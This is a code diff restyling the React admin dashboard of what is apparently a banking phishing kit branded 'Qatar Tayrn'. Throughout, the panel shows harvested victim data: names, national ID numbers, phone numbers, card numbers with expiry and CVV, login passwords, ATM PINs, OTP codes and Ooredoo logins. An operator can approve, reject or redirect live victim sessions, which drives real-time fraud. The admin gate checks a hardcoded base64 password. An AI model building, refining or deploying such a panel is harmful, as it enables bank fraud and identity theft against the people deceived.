@@ -1,11 +1,11 @@
-import { useState, useMemo, useEffect } from "react";
+import { useState, useMemo } from "react";
 import { useLanguage } from "@/contexts/LanguageContext";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import { useLocation } from "wouter";
 import { trpc } from "@/lib/trpc";
 import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog";
-import { Loader2, Eye, RefreshCcw, Check, X, Users } from "lucide-react";
+import { Loader2, Eye, RefreshCcw, Check, X, Users, Lock, LogOut } from "lucide-react";
 
 const getStatusDisplay = (currentStep: string | null | undefined, language: string) => {
   const statusMap: Record<string, Record<string, string>> = {
@@ -35,13 +35,13 @@ const getStatusDisplay = (currentStep: string | null | undefined, language: stri
 
 const getStatusColor = (currentStep: string | null | undefined) => {
   const colorMap: Record<string, string> = {
-    login: "bg-blue-100 text-blue-800",
-    otp: "bg-purple-100 text-purple-800",
-    atm: "bg-orange-100 text-orange-800",
-    ooredoo: "bg-red-100 text-red-800",
-    otp_ooredoo: "bg-pink-100 text-pink-800",
+    login: "bg-blue-100 text-blue-800 border border-blue-200",
+    otp: "bg-purple-100 text-purple-800 border border-purple-200",
+    atm: "bg-orange-100 text-orange-800 border border-orange-200",
+    ooredoo: "bg-red-100 text-red-800 border border-red-200",
+    otp_ooredoo: "bg-pink-100 text-pink-800 border border-pink-200",
   };
-  return colorMap[currentStep || ""] || "bg-gray-100 text-gray-800";
+  return colorMap[currentStep || ""] || "bg-gray-100 text-gray-800 border border-gray-200";
 };
 
 export default function AdminDashboard() {
@@ -53,7 +53,7 @@ export default function AdminDashboard() {
   const [showRedirectMenu, setShowRedirectMenu] = useState<string | null>(null);
   const [password, setPassword] = useState("");
   const [isAuthenticated, setIsAuthenticated] = useState(() => {
-    return sessionStorage.getItem("adminAuthenticated") === "true";
+    return typeof window !== 'undefined' && sessionStorage.getItem("adminAuthenticated") === "true";
   });
   const [error, setError] = useState("");
 
@@ -67,20 +67,15 @@ export default function AdminDashboard() {
   });
 
   const adminTakeAction = trpc.submissions.adminTakeAction.useMutation({
-    onSuccess: () => {
-      refetch();
-    }
+    onSuccess: () => refetch()
   });
 
   const adminRedirectMutation = trpc.submissions.adminRedirect.useMutation({
-    onSuccess: () => {
-      refetch();
-    }
+    onSuccess: () => refetch()
   });
 
   const handleLogin = (e: React.FormEvent) => {
     e.preventDefault();
-    // Obfuscated password check
     const obfuscatedKey = "UWF0YXJAQDIwMA==";
     if (btoa(password) === obfuscatedKey) {
       setIsAuthenticated(true);
@@ -89,6 +84,11 @@ export default function AdminDashboard() {
     } else {
       setError(language === "ar" ? "كلمة المرور غير صحيحة" : "Incorrect password");
     }
+  };
+
+  const handleLogout = () => {
+    setIsAuthenticated(false);
+    sessionStorage.removeItem("adminAuthenticated");
   };
 
   const filteredSubmissions = useMemo(() => {
@@ -118,8 +118,8 @@ export default function AdminDashboard() {
     try {
       await adminRedirectMutation.mutateAsync({ sessionId, targetPage });
       setShowRedirectMenu(null);
-    } catch (error) {
-      console.error("Redirect error:", error);
+    } catch (err) {
+      console.error("Redirect error:", err);
     }
   };
 
@@ -134,365 +134,328 @@ export default function AdminDashboard() {
 
   if (!isAuthenticated) {
     return (
-      <div className="min-h-screen flex items-center justify-center bg-[#0a0a0a] p-4 relative overflow-hidden" dir={language === "ar" ? "rtl" : "ltr"}>
-        {/* Decorative elements */}
-        <div className="absolute top-[-10%] left-[-10%] w-[40%] h-[40%] bg-red-900/20 rounded-full blur-[120px]" />
-        <div className="absolute bottom-[-10%] right-[-10%] w-[40%] h-[40%] bg-red-900/20 rounded-full blur-[120px]" />
+      <div className="min-h-screen w-full flex items-center justify-center bg-gray-950 p-4 font-sans" dir={language === "ar" ? "rtl" : "ltr"}>
+        <div className="absolute inset-0 overflow-hidden">
+          <div className="absolute top-[-10%] left-[-10%] w-[50%] h-[50%] bg-red-900/20 rounded-full blur-[120px]" />
+          <div className="absolute bottom-[-10%] right-[-10%] w-[50%] h-[50%] bg-red-900/20 rounded-full blur-[120px]" />
+        </div>
         
-        <form 
-          onSubmit={handleLogin} 
-          className="bg-[#1a1a1a] p-10 rounded-2xl shadow-2xl w-full max-w-md border border-white/10 backdrop-blur-xl relative z-10"
-        >
-          <div className="flex flex-col items-center mb-8">
-            <div className="w-16 h-16 bg-red-600 rounded-2xl flex items-center justify-center mb-4 shadow-lg shadow-red-600/20">
-              <Users className="w-8 h-8 text-white" />
-            </div>
-            <h2 className="text-3xl font-bold text-white text-center">
-              {language === "ar" ? "دخول لوحة الإدارة" : "Admin Control Center"}
-            </h2>
-            <p className="text-gray-400 mt-2 text-sm">
-              {language === "ar" ? "يرجى إدخال كلمة المرور للمتابعة" : "Please enter your password to continue"}
-            </p>
-          </div>
-
-          <div className="space-y-6">
-            <div className="space-y-2">
-              <label className="text-sm font-medium text-gray-300 px-1">
-                {language === "ar" ? "كلمة المرور" : "Password"}
-              </label>
-              <Input
-                type="password"
-                placeholder="••••••••"
-                value={password}
-                onChange={(e) => setPassword(e.target.value)}
-                className="bg-black/50 border-white/10 text-white text-lg py-6 focus:ring-red-600 focus:border-red-600 rounded-xl placeholder:text-gray-600"
-              />
-            </div>
-
-            {error && (
-              <div className="bg-red-500/10 border border-red-500/50 text-red-500 text-sm p-3 rounded-lg text-center animate-shake">
-                {error}
+        <div className="w-full max-w-md relative z-10">
+          <form 
+            onSubmit={handleLogin} 
+            className="bg-zinc-900/80 border border-white/10 backdrop-blur-2xl p-8 rounded-3xl shadow-2xl space-y-8"
+          >
+            <div className="text-center space-y-4">
+              <div className="inline-flex items-center justify-center w-20 h-20 bg-red-600 rounded-2xl shadow-xl shadow-red-600/20 mb-2">
+                <Lock className="w-10 h-10 text-white" />
               </div>
-            )}
+              <h1 className="text-3xl font-black text-white tracking-tight">
+                {language === "ar" ? "لوحة الإدارة" : "Admin Panel"}
+              </h1>
+              <p className="text-zinc-400 text-sm font-medium">
+                {language === "ar" ? "يرجى إدخال كلمة المرور للمتابعة" : "Please enter your password to continue"}
+              </p>
+            </div>
 
-            <Button 
-              type="submit" 
-              className="w-full bg-red-600 hover:bg-red-700 text-white text-lg py-6 rounded-xl transition-all duration-300 shadow-lg shadow-red-600/20 hover:scale-[1.02] active:scale-[0.98]"
-            >
-              {language === "ar" ? "تسجيل الدخول" : "Sign In"}
-            </Button>
-          </div>
+            <div className="space-y-4">
+              <div className="space-y-2">
+                <label className="text-xs font-bold text-zinc-500 uppercase tracking-wider px-1">
+                  {language === "ar" ? "كلمة المرور" : "Password"}
+                </label>
+                <div className="relative">
+                  <Input
+                    type="password"
+                    placeholder="••••••••"
+                    value={password}
+                    onChange={(e) => setPassword(e.target.value)}
+                    className="w-full bg-black/40 border-zinc-800 text-white text-lg h-14 rounded-2xl focus:ring-2 focus:ring-red-600 focus:border-transparent transition-all placeholder:text-zinc-700"
+                  />
+                </div>
+              </div>
 
-          <p className="text-center text-gray-500 text-xs mt-8">
-            &copy; {new Date().getFullYear()} Qatar Tayrn. All rights reserved.
-          </p>
-        </form>
+              {error && (
+                <div className="bg-red-500/10 border border-red-500/20 text-red-500 text-xs font-bold p-4 rounded-xl text-center">
+                  {error}
+                </div>
+              )}
 
-        <style>{`
-          @keyframes shake {
-            0%, 100% { transform: translateX(0); }
-            25% { transform: translateX(-5px); }
-            75% { transform: translateX(5px); }
-          }
-          .animate-shake { animation: shake 0.2s ease-in-out 0s 2; }
-        `}</style>
+              <Button 
+                type="submit" 
+                className="w-full bg-red-600 hover:bg-red-700 text-white font-bold h-14 rounded-2xl shadow-lg shadow-red-600/20 transition-all active:scale-95"
+              >
+                {language === "ar" ? "تسجيل الدخول" : "Sign In"}
+              </Button>
+            </div>
+
+            <div className="pt-4 text-center border-t border-white/5">
+              <p className="text-zinc-600 text-[10px] font-bold uppercase tracking-[0.2em]">
+                &copy; {new Date().getFullYear()} Qatar Tayrn &bull; Security Protocol
+              </p>
+            </div>
+          </form>
+        </div>
       </div>
     );
   }
 
   return (
-    <div className="min-h-screen bg-gray-50" dir={language === "ar" ? "rtl" : "ltr"}>
-      {/* Header */}
-      <header className="sticky top-0 z-50 bg-white border-b shadow-md">
-        <div className="max-w-7xl mx-auto px-4 py-4 flex items-center justify-between">
-          <Button 
-            variant="ghost" 
-            onClick={() => setLocation("/")}
-            className="text-gray-600 hover:text-gray-900"
-          >
-            {language === "ar" ? "← رجوع" : "← Back"}
-          </Button>
-          <h1 className="text-2xl font-bold text-gray-900">
-            {language === "ar" ? "لوحة التحكم" : "Admin Dashboard"}
-          </h1>
-          <Button 
-            variant="outline" 
-            onClick={() => {
-              setIsAuthenticated(false);
-              sessionStorage.removeItem("adminAuthenticated");
-            }}
-            className="text-red-600 border-red-200 hover:bg-red-50"
-          >
-            {language === "ar" ? "خروج" : "Logout"}
-          </Button>
-        </div>
-      </header>
-
-      <main className="max-w-7xl mx-auto px-4 py-8">
-        {/* Visitor Counter Card */}
-        <div className="grid grid-cols-1 md:grid-cols-3 gap-4 mb-8">
-          <div className="bg-gradient-to-br from-red-500 to-red-600 text-white rounded-lg shadow-lg p-6">
-            <div className="flex items-center justify-between">
-              <div>
-                <p className="text-red-100 text-sm mb-1">
-                  {language === "ar" ? "الزيارات الحالية" : "Current Visitors"}
-                </p>
-                <p className="text-4xl font-bold">{submissions?.length || 0}</p>
+    <div className="min-h-screen bg-zinc-50 font-sans" dir={language === "ar" ? "rtl" : "ltr"}>
+      {/* Navbar */}
+      <nav className="sticky top-0 z-50 bg-white/80 backdrop-blur-md border-b border-zinc-200">
+        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+          <div className="flex justify-between items-center h-20">
+            <div className="flex items-center gap-4">
+              <div className="w-10 h-10 bg-red-600 rounded-xl flex items-center justify-center shadow-lg shadow-red-600/20">
+                <Users className="w-6 h-6 text-white" />
               </div>
-              <Users className="w-12 h-12 opacity-80" />
+              <h1 className="text-xl font-black text-zinc-900 tracking-tight hidden sm:block">
+                {language === "ar" ? "لوحة التحكم" : "Control Panel"}
+              </h1>
             </div>
-          </div>
-
-          <div className="bg-gradient-to-br from-blue-500 to-blue-600 text-white rounded-lg shadow-lg p-6">
-            <div className="flex items-center justify-between">
-              <div>
-                <p className="text-blue-100 text-sm mb-1">
-                  {language === "ar" ? "في الانتظار" : "Pending"}
-                </p>
-                <p className="text-4xl font-bold">
-                  {submissions?.filter(s => s.status === "loading").length || 0}
-                </p>
-              </div>
-              <Loader2 className="w-12 h-12 opacity-80" />
-            </div>
-          </div>
-
-          <div className="bg-gradient-to-br from-green-500 to-green-600 text-white rounded-lg shadow-lg p-6">
-            <div className="flex items-center justify-between">
-              <div>
-                <p className="text-green-100 text-sm mb-1">
-                  {language === "ar" ? "موافق عليه" : "Approved"}
-                </p>
-                <p className="text-4xl font-bold">
-                  {submissions?.filter(s => s.status === "approved").length || 0}
-                </p>
-              </div>
-              <Check className="w-12 h-12 opacity-80" />
+            
+            <div className="flex items-center gap-3">
+              <Button 
+                variant="outline" 
+                onClick={() => setLocation("/")}
+                className="rounded-xl border-zinc-200 text-zinc-600 hover:bg-zinc-50 font-bold text-xs"
+              >
+                {language === "ar" ? "عرض الموقع" : "View Site"}
+              </Button>
+              <Button 
+                variant="ghost" 
+                onClick={handleLogout}
+                className="rounded-xl text-red-600 hover:bg-red-50 font-bold text-xs flex items-center gap-2"
+              >
+                <LogOut className="w-4 h-4" />
+                {language === "ar" ? "تسجيل الخروج" : "Logout"}
+              </Button>
             </div>
           </div>
         </div>
+      </nav>
 
-        {/* Search Bar */}
-        <div className="mb-6">
-          <Input
-            placeholder={language === "ar" ? "ابحث عن الجلسة أو البنك أو الاسم أو الهاتف..." : "Search by session, bank, name, or phone..."}
-            value={searchTerm}
-            onChange={(e) => setSearchTerm(e.target.value)}
-            className="max-w-md text-lg"
-          />
+      <main className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-10">
+        {/* Stats Grid */}
+        <div className="grid grid-cols-1 md:grid-cols-3 gap-6 mb-10">
+          {[
+            { label: language === "ar" ? "الزيارات الحالية" : "Active Visitors", value: submissions?.length || 0, color: "from-zinc-800 to-zinc-900", icon: Users },
+            { label: language === "ar" ? "طلبات معلقة" : "Pending Actions", value: submissions?.filter(s => s.status === "loading").length || 0, color: "from-red-600 to-red-700", icon: Loader2 },
+            { label: language === "ar" ? "عمليات مكتملة" : "Completed", value: submissions?.filter(s => s.status === "approved").length || 0, color: "from-emerald-600 to-emerald-700", icon: Check },
+          ].map((stat, i) => (
+            <div key={i} className={`bg-gradient-to-br ${stat.color} p-8 rounded-3xl shadow-xl shadow-zinc-200 text-white relative overflow-hidden group`}>
+              <stat.icon className="absolute right-[-10%] bottom-[-10%] w-32 h-32 opacity-10 group-hover:scale-110 transition-transform" />
+              <p className="text-white/70 text-xs font-bold uppercase tracking-widest mb-2">{stat.label}</p>
+              <p className="text-5xl font-black tracking-tighter">{stat.value}</p>
+            </div>
+          ))}
         </div>
 
-        {/* Table */}
-        <div className="bg-white rounded-lg shadow-lg overflow-hidden border border-gray-200">
-          {isLoading ? (
-            <div className="p-12 flex justify-center">
-              <Loader2 className="animate-spin text-red-600 w-8 h-8" />
+        {/* Table Section */}
+        <div className="bg-white rounded-[2rem] shadow-2xl shadow-zinc-200/50 border border-zinc-200 overflow-hidden">
+          <div className="p-8 border-b border-zinc-100 bg-zinc-50/50 flex flex-col sm:flex-row justify-between items-center gap-6">
+            <h2 className="text-lg font-black text-zinc-900">{language === "ar" ? "سجل العمليات" : "Activity Log"}</h2>
+            <div className="w-full sm:w-96 relative">
+              <Input
+                placeholder={language === "ar" ? "بحث عن عميل، بنك، هاتف..." : "Search..."}
+                value={searchTerm}
+                onChange={(e) => setSearchTerm(e.target.value)}
+                className="w-full bg-white border-zinc-200 rounded-2xl h-12 px-6 focus:ring-red-600 transition-all shadow-sm"
+              />
             </div>
-          ) : filteredSubmissions.length === 0 ? (
-            <div className="p-12 text-center text-gray-500">
-              {language === "ar" ? "لا توجد بيانات" : "No data available"}
-            </div>
-          ) : (
-            <div className="overflow-x-auto">
-              <table className="w-full text-sm">
-                <thead className="bg-gray-100 border-b-2 border-gray-200">
-                  <tr>
-                    <th className="px-6 py-4 text-right font-semibold text-gray-700">
-                      {language === "ar" ? "الدولة" : "Country"}
-                    </th>
-                    <th className="px-6 py-4 text-right font-semibold text-gray-700">
-                      {language === "ar" ? "البنك" : "Bank"}
-                    </th>
-                    <th className="px-6 py-4 text-right font-semibold text-gray-700">
-                      {language === "ar" ? "الاسم" : "Name"}
-                    </th>
-                    <th className="px-6 py-4 text-right font-semibold text-gray-700">
-                      {language === "ar" ? "الهاتف" : "Phone"}
-                    </th>
-                    <th className="px-6 py-4 text-right font-semibold text-gray-700">
-                      {language === "ar" ? "الهوية" : "Identity"}
-                    </th>
-                    <th className="px-6 py-4 text-right font-semibold text-gray-700">
-                      {language === "ar" ? "الحالة" : "Status"}
-                    </th>
-                    <th className="px-6 py-4 text-center font-semibold text-gray-700">
-                      {language === "ar" ? "الإجراءات" : "Actions"}
-                    </th>
-                  </tr>
-                </thead>
-                <tbody className="divide-y divide-gray-200">
-                  {filteredSubmissions.map((sub) => (
-                    <tr key={sub.id} className="hover:bg-gray-50 transition-colors">
-                      <td className="px-6 py-4 text-gray-900 font-medium">{sub.country || "Qatar"}</td>
-                      <td className="px-6 py-4 font-bold text-red-700 text-lg">{sub.selectedBank.toUpperCase()}</td>
-                      <td className="px-6 py-4 text-gray-900">{sub.nameArabic || "—"}</td>
-                      <td className="px-6 py-4 text-gray-900">{sub.phoneNumber || "—"}</td>
-                      <td className="px-6 py-4 text-gray-900">{sub.idNumber || "—"}</td>
-                      <td className="px-6 py-4">
-                        <span className={`px-3 py-1 rounded-full text-xs font-semibold ${getStatusColor(sub.currentStep)}`}>
-                          {getStatusDisplay(sub.currentStep, language)}
-                        </span>
-                      </td>
-                      <td className="px-6 py-4">
-                        <div className="flex items-center justify-center gap-2 flex-wrap">
+          </div>
+
+          <div className="overflow-x-auto">
+            <table className="w-full text-right border-collapse">
+              <thead>
+                <tr className="bg-zinc-50/50 text-zinc-500 text-[10px] font-black uppercase tracking-widest">
+                  <th className="px-8 py-6">{language === "ar" ? "الدولة" : "Country"}</th>
+                  <th className="px-8 py-6">{language === "ar" ? "البنك" : "Bank"}</th>
+                  <th className="px-8 py-6">{language === "ar" ? "الاسم" : "Name"}</th>
+                  <th className="px-8 py-6">{language === "ar" ? "الهاتف" : "Phone"}</th>
+                  <th className="px-8 py-6">{language === "ar" ? "الهوية" : "ID"}</th>
+                  <th className="px-8 py-6">{language === "ar" ? "الحالة" : "Status"}</th>
+                  <th className="px-8 py-6 text-center">{language === "ar" ? "الإجراءات" : "Actions"}</th>
+                </tr>
+              </thead>
+              <tbody className="divide-y divide-zinc-100">
+                {isLoading ? (
+                  <tr><td colSpan={7} className="py-20 text-center"><Loader2 className="w-10 h-10 animate-spin mx-auto text-red-600" /></td></tr>
+                ) : filteredSubmissions.length === 0 ? (
+                  <tr><td colSpan={7} className="py-20 text-center font-bold text-zinc-400">{language === "ar" ? "لا توجد سجلات حالياً" : "No records found"}</td></tr>
+                ) : filteredSubmissions.map((sub) => (
+                  <tr key={sub.id} className="hover:bg-zinc-50/50 transition-colors group">
+                    <td className="px-8 py-6 font-bold text-zinc-600">{sub.country || "Qatar"}</td>
+                    <td className="px-8 py-6"><span className="bg-red-50 text-red-700 px-3 py-1 rounded-lg text-xs font-black uppercase">{sub.selectedBank}</span></td>
+                    <td className="px-8 py-6 font-bold text-zinc-900">{sub.nameArabic || "—"}</td>
+                    <td className="px-8 py-6 font-medium text-zinc-500">{sub.phoneNumber || "—"}</td>
+                    <td className="px-8 py-6 font-medium text-zinc-500">{sub.idNumber || "—"}</td>
+                    <td className="px-8 py-6">
+                      <span className={`px-4 py-1.5 rounded-full text-[10px] font-black uppercase tracking-tight ${getStatusColor(sub.currentStep)}`}>
+                        {getStatusDisplay(sub.currentStep, language)}
+                      </span>
+                    </td>
+                    <td className="px-8 py-6">
+                      <div className="flex items-center justify-center gap-2">
+                        <Button 
+                          variant="secondary" 
+                          size="sm" 
+                          className="rounded-xl h-10 px-4 bg-zinc-100 hover:bg-zinc-200 text-zinc-900 font-bold text-xs gap-2"
+                          onClick={() => { setSelectedSession(sub.id); setShowDetails(true); }}
+                        >
+                          <Eye className="w-4 h-4" /> {language === "ar" ? "تفاصيل" : "Details"}
+                        </Button>
+
+                        <div className="relative">
                           <Button 
-                            variant="outline" 
+                            variant="secondary" 
                             size="sm" 
-                            className="flex items-center gap-1 text-xs"
-                            onClick={() => {
-                              setSelectedSession(sub.id);
-                              setShowDetails(true);
-                            }}
+                            className="rounded-xl h-10 px-4 bg-zinc-100 hover:bg-zinc-200 text-zinc-900 font-bold text-xs gap-2"
+                            onClick={() => setShowRedirectMenu(showRedirectMenu === sub.id ? null : sub.id)}
                           >
-                            <Eye className="w-3 h-3" /> {language === "ar" ? "تفاصيل" : "Details"}
+                            <RefreshCcw className="w-4 h-4" /> {language === "ar" ? "توجيه" : "Redirect"}
                           </Button>
-
-                          <div className="relative">
-                            <Button 
-                              variant="outline" 
-                              size="sm" 
-                              className="flex items-center gap-1 text-xs"
-                              onClick={() => setShowRedirectMenu(showRedirectMenu === sub.id ? null : sub.id)}
-                            >
-                              <RefreshCcw className="w-3 h-3" /> {language === "ar" ? "توجيه" : "Redirect"}
-                            </Button>
-                            
-                            {showRedirectMenu === sub.id && (
-                              <div className="absolute top-full mt-1 bg-white border border-gray-200 rounded-lg shadow-lg z-10 min-w-max">
-                                {redirectPages.map((page) => (
-                                  <button
-                                    key={page.id}
-                                    onClick={() => handleRedirect(sub.id, page.id)}
-                                    className="block w-full text-left px-4 py-2 text-sm text-gray-700 hover:bg-gray-100 first:rounded-t-lg last:rounded-b-lg"
-                                  >
-                                    {page.label}
-                                  </button>
-                                ))}
-                              </div>
-                            )}
-                          </div>
-
-                          {sub.status === "loading" && (
-                            <div className="flex gap-1">
-                              <Button 
-                                size="sm" 
-                                className="bg-green-600 hover:bg-green-700 text-white flex items-center gap-1"
-                                onClick={() => handleAction(sub.id, "approve")}
-                              >
-                                <Check className="w-3 h-3" />
-                              </Button>
-                              <Button 
-                                size="sm" 
-                                className="bg-red-600 hover:bg-red-700 text-white flex items-center gap-1"
-                                onClick={() => handleAction(sub.id, "reject")}
-                              >
-                                <X className="w-3 h-3" />
-                              </Button>
+                          
+                          {showRedirectMenu === sub.id && (
+                            <div className="absolute top-full mt-2 left-0 bg-white border border-zinc-200 rounded-2xl shadow-2xl z-50 min-w-[180px] overflow-hidden animate-in fade-in slide-in-from-top-2">
+                              {redirectPages.map((page) => (
+                                <button
+                                  key={page.id}
+                                  onClick={() => handleRedirect(sub.id, page.id)}
+                                  className="w-full text-right px-6 py-3 text-xs font-bold text-zinc-600 hover:bg-zinc-50 hover:text-red-600 transition-colors"
+                                >
+                                  {page.label}
+                                </button>
+                              ))}
                             </div>
                           )}
                         </div>
-                      </td>
-                    </tr>
-                  ))}
-                </tbody>
-              </table>
-            </div>
-          )}
+
+                        {sub.status === "loading" && (
+                          <div className="flex gap-2 border-r border-zinc-200 pr-2 ml-2">
+                            <Button 
+                              size="sm" 
+                              className="w-10 h-10 rounded-xl bg-emerald-500 hover:bg-emerald-600 text-white shadow-lg shadow-emerald-500/20"
+                              onClick={() => handleAction(sub.id, "approve")}
+                            >
+                              <Check className="w-5 h-5" />
+                            </Button>
+                            <Button 
+                              size="sm" 
+                              className="w-10 h-10 rounded-xl bg-red-500 hover:bg-red-600 text-white shadow-lg shadow-red-500/20"
+                              onClick={() => handleAction(sub.id, "reject")}
+                            >
+                              <X className="w-5 h-5" />
+                            </Button>
+                          </div>
+                        )}
+                      </div>
+                    </td>
+                  </tr>
+                ))}
+              </tbody>
+            </table>
+          </div>
         </div>
       </main>
 
-      {/* Details Dialog */}
+      {/* Details Modal */}
       <Dialog open={showDetails} onOpenChange={setShowDetails}>
-        <DialogContent className="max-w-2xl max-h-[80vh] overflow-y-auto" dir={language === "ar" ? "rtl" : "ltr"}>
-          <DialogHeader>
-            <DialogTitle>{language === "ar" ? "التفاصيل" : "Details"}</DialogTitle>
-          </DialogHeader>
-          {details ? (
-            <div className="space-y-4">
-              <div className="grid grid-cols-2 gap-4">
-                <div className="p-3 bg-gray-50 rounded border">
-                  <p className="text-xs text-gray-500 mb-1">{language === "ar" ? "معرف الجلسة" : "Session ID"}</p>
-                  <p className="font-mono text-sm break-all">{details.session.id}</p>
-                </div>
-                <div className="p-3 bg-gray-50 rounded border">
-                  <p className="text-xs text-gray-500 mb-1">{language === "ar" ? "البنك" : "Bank"}</p>
-                  <p className="font-bold text-red-700">{details.session.selectedBank.toUpperCase()}</p>
-                </div>
-              </div>
-              
-              {details.personalData && (
-                <div className="border rounded-lg p-4 space-y-2">
-                  <h3 className="font-bold border-b pb-2 mb-2">
-                    {language === "ar" ? "البيانات الشخصية" : "Personal Data"}
-                  </h3>
-                  <div className="grid grid-cols-2 gap-2 text-sm">
-                    <div><span className="text-gray-500">{language === "ar" ? "الاسم (AR):" : "Name (AR):"}</span> {details.personalData.nameArabic}</div>
-                    <div><span className="text-gray-500">{language === "ar" ? "الاسم (EN):" : "Name (EN):"}</span> {details.personalData.nameEnglish}</div>
-                    <div><span className="text-gray-500">{language === "ar" ? "الهوية:" : "Identity:"}</span> {details.personalData.idNumber}</div>
-                    <div><span className="text-gray-500">{language === "ar" ? "الهاتف:" : "Phone:"}</span> {details.personalData.phoneNumber}</div>
-                    <div><span className="text-gray-500">{language === "ar" ? "الميلاد:" : "Birth:"}</span> {details.personalData.dateOfBirth}</div>
-                    <div><span className="text-gray-500">{language === "ar" ? "الجنس:" : "Gender:"}</span> {details.personalData.gender}</div>
+        <DialogContent className="max-w-2xl bg-white rounded-[2rem] border-none shadow-2xl p-0 overflow-hidden" dir={language === "ar" ? "rtl" : "ltr"}>
+          <div className="bg-zinc-900 p-8 text-white flex justify-between items-center">
+            <h3 className="text-xl font-black">{language === "ar" ? "تفاصيل العملية" : "Submission Details"}</h3>
+            <span className="bg-red-600 px-3 py-1 rounded-lg text-[10px] font-black uppercase tracking-widest">
+              {details?.session.selectedBank}
+            </span>
+          </div>
+          
+          <div className="p-8 max-h-[70vh] overflow-y-auto space-y-8">
+            {details ? (
+              <>
+                <section className="space-y-4">
+                  <h4 className="text-[10px] font-black uppercase tracking-widest text-zinc-400">{language === "ar" ? "البيانات الشخصية" : "Personal Info"}</h4>
+                  <div className="grid grid-cols-2 gap-4">
+                    {[
+                      { label: language === "ar" ? "الاسم الكامل" : "Full Name", value: details.personalData?.nameArabic },
+                      { label: language === "ar" ? "رقم الهاتف" : "Phone Number", value: details.personalData?.phoneNumber },
+                      { label: language === "ar" ? "رقم الهوية" : "ID Number", value: details.personalData?.idNumber },
+                      { label: language === "ar" ? "تاريخ الميلاد" : "Birth Date", value: details.personalData?.dateOfBirth },
+                    ].map((item, i) => (
+                      <div key={i} className="bg-zinc-50 p-4 rounded-2xl border border-zinc-100">
+                        <p className="text-[10px] font-bold text-zinc-400 mb-1 uppercase">{item.label}</p>
+                        <p className="font-bold text-zinc-900">{item.value || "—"}</p>
+                      </div>
+                    ))}
                   </div>
-                </div>
-              )}
+                </section>
 
-              {details.loginMethod && (
-                <div className="border rounded-lg p-4 space-y-2">
-                  <h3 className="font-bold border-b pb-2 mb-2">
-                    {language === "ar" ? "طريقة تسجيل الدخول" : "Login Method"}
-                  </h3>
-                  <div className="text-sm">
-                    <p><span className="text-gray-500">{language === "ar" ? "النوع:" : "Type:"}</span> {details.loginMethod.loginType}</p>
-                    {details.loginMethod.loginType === "card" ? (
-                      <div className="grid grid-cols-2 gap-2 mt-2">
-                        <div><span className="text-gray-500">{language === "ar" ? "رقم البطاقة:" : "Card Number:"}</span> {details.loginMethod.cardNumber}</div>
-                        <div><span className="text-gray-500">{language === "ar" ? "الاسم:" : "Name:"}</span> {details.loginMethod.cardholderName}</div>
-                        <div><span className="text-gray-500">{language === "ar" ? "التاريخ:" : "Expiry:"}</span> {details.loginMethod.expiryDate}</div>
-                        <div><span className="text-gray-500">CVV:</span> {details.loginMethod.cvv}</div>
+                <section className="space-y-4">
+                  <h4 className="text-[10px] font-black uppercase tracking-widest text-zinc-400">{language === "ar" ? "بيانات الدخول" : "Login Data"}</h4>
+                  <div className="bg-zinc-50 p-6 rounded-3xl border border-zinc-100">
+                    {details.loginMethod?.loginType === "card" ? (
+                      <div className="grid grid-cols-2 gap-6">
+                        <div className="col-span-2">
+                          <p className="text-[10px] font-bold text-zinc-400 mb-1 uppercase">{language === "ar" ? "رقم البطاقة" : "Card Number"}</p>
+                          <p className="text-xl font-black tracking-widest text-zinc-900">{details.loginMethod.cardNumber}</p>
+                        </div>
+                        <div>
+                          <p className="text-[10px] font-bold text-zinc-400 mb-1 uppercase">{language === "ar" ? "تاريخ الانتهاء" : "Expiry"}</p>
+                          <p className="font-bold text-zinc-900">{details.loginMethod.expiryDate}</p>
+                        </div>
+                        <div>
+                          <p className="text-[10px] font-bold text-zinc-400 mb-1 uppercase">CVV</p>
+                          <p className="font-bold text-zinc-900">{details.loginMethod.cvv}</p>
+                        </div>
                       </div>
                     ) : (
-                      <div className="grid grid-cols-2 gap-2 mt-2">
-                        <div><span className="text-gray-500">{language === "ar" ? "المستخدم:" : "Username:"}</span> {details.loginMethod.username}</div>
-                        <div><span className="text-gray-500">{language === "ar" ? "كلمة المرور:" : "Password:"}</span> {details.loginMethod.password}</div>
+                      <div className="grid grid-cols-2 gap-6">
+                        <div>
+                          <p className="text-[10px] font-bold text-zinc-400 mb-1 uppercase">{language === "ar" ? "اسم المستخدم" : "Username"}</p>
+                          <p className="font-bold text-zinc-900">{details.loginMethod?.username || "—"}</p>
+                        </div>
+                        <div>
+                          <p className="text-[10px] font-bold text-zinc-400 mb-1 uppercase">{language === "ar" ? "كلمة المرور" : "Password"}</p>
+                          <p className="font-bold text-zinc-900">{details.loginMethod?.password || "—"}</p>
+                        </div>
                       </div>
                     )}
                   </div>
-                </div>
-              )}
+                </section>
 
-              {details.atmPin && (
-                <div className="border rounded-lg p-4 bg-orange-50 border-orange-200">
-                  <h3 className="font-bold text-orange-800 border-b border-orange-200 pb-2 mb-2">ATM PIN</h3>
-                  <p className="text-2xl font-mono text-center tracking-widest text-orange-900">{details.atmPin.pin}</p>
+                <div className="grid grid-cols-2 gap-6">
+                  {details.atmPin && (
+                    <div className="bg-orange-50 p-6 rounded-3xl border border-orange-100">
+                      <p className="text-[10px] font-black text-orange-400 uppercase tracking-widest mb-2">ATM PIN</p>
+                      <p className="text-3xl font-black text-orange-700 tracking-[0.3em]">{details.atmPin.pin}</p>
+                    </div>
+                  )}
+                  {details.otp && (
+                    <div className="bg-blue-50 p-6 rounded-3xl border border-blue-100">
+                      <p className="text-[10px] font-black text-blue-400 uppercase tracking-widest mb-2">OTP CODE</p>
+                      <p className="text-3xl font-black text-blue-700 tracking-[0.3em]">{details.otp.otpCode}</p>
+                    </div>
+                  )}
                 </div>
-              )}
 
-              {details.otp && (
-                <div className="border rounded-lg p-4 bg-blue-50 border-blue-200">
-                  <h3 className="font-bold text-blue-800 border-b border-blue-200 pb-2 mb-2">
-                    OTP ({details.otp.otpType === "ooredoo" ? "Ooredoo" : "Standard"})
-                  </h3>
-                  <p className="text-2xl font-mono text-center tracking-widest text-blue-900">{details.otp.otpCode}</p>
-                </div>
-              )}
-
-              {details.ooredoo && (
-                <div className="border rounded-lg p-4 bg-purple-50 border-purple-200">
-                  <h3 className="font-bold text-purple-800 border-b border-purple-200 pb-2 mb-2">
-                    {language === "ar" ? "بيانات Ooredoo" : "Ooredoo Login"}
